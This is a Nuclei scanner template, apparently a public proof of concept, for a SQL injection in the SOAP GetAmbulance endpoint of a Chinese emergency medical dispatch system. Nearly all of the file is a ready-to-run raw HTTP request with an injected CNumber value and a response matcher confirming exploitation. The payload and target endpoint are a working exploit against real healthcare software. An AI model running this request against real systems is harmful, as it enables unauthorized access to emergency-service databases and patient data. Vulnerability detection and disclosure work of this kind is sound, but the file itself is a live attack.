pocs/nuclei/akdz-Service-sqli.yaml

id: akdz-Service-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 珠海市安克电子技术有限公司成立于1992年，专业从事急救信息化系统集成与软件开发，是国内领先的院前急救信息系统供应商。在北京、合肥、西安设有研发中心，在全国设有分支机构和服务网点20个，具有ISO9000等质量体系、高新技术企业、软件企业、信息系统集成等多项认证资质，珠海市安克电子技术有限公司医疗急救管理系统存在SQL注入漏洞。
  reference:
    - https://github.com/wy876/POC/blob/main/%E5%AE%89%E5%85%8B%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF/%E7%8F%A0%E6%B5%B7%E5%B8%82%E5%AE%89%E5%85%8B%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%8C%BB%E7%96%97%E6%80%A5%E6%95%91%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: tags

http:
  - raw:
      - |-
        POST /api/Service.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        Content-Length: 360
        SOAPAction: "http://tempuri.org/GetAmbulance"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetAmbulance xmlns="http://tempuri.org/">
              <CNumber>11' AND 6537 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6537=6537) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)))-- ntgj</CNumber>
            </GetAmbulance>
          </soap:Body>
        </soap:Envelope>
        
    matchers:
      - type: word
        part: body
        words:
          - 'qjbvq'